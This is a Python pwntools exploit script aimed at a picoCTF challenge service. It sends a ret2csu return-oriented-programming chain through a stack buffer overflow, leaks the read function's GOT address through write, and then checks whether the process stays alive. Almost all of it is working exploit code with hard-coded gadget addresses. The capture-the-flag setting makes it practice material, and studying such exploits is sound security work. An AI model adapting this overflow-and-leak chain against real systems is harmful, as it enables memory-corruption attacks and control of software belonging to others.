from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602500
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(1)
    payload += p64(csu_call)
    payload += b'J' * 8 
    # Infinite loop to keep alive
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(1)
    payload += p64(csu_call)
    payload += b'J' * 8 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    r.recvn(8) # leak
    
    # Send 1 byte
    r.send(b'A')
    
    # Try to recv - should timeout if alive
    try:
        r.recv(timeout=5)
        print("Received something (unexpected)")
    except EOFError:
        print("EOF - Crashed")
    except:
        print("Timeout - Alive!")

leak_read()
r.close()
